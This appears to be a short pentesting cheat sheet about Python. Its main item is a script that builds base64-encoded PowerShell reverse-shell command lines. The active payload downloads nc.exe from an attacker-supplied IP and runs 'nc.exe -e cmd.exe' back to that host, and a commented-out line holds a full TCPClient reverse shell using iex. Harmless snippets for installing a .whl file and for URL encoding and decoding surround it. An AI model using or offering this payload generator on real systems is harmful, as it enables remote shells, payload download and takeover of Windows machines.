# Python

### Manual install .whl
```python
python3 -m pip install --user <package_name>.whl
```


### Powershell base64 encode 

```python
#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
#

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

#payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = 'Invoke-WebRequest -Uri http://%s/nc.exe -Outfile C:\\Windows\\Temp\\nc.exe ; C:\\Windows\\Temp\\nc.exe -e cmd.exe %s %d;'
payload = payload % (ip, ip, port)
print (payload)
cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmdline)
```

## Encode/decode url

using cli

```bash
alias urldecode='python -c "import sys, urllib as ul; \ print ul.unquote_plus(sys.argv[1])"'
alias urlencode='python -c "import sys, urllib as ul; \ print ul.quote_plus(sys.argv[1])"'
# using => urlencode 'q werty=/;'
```

---
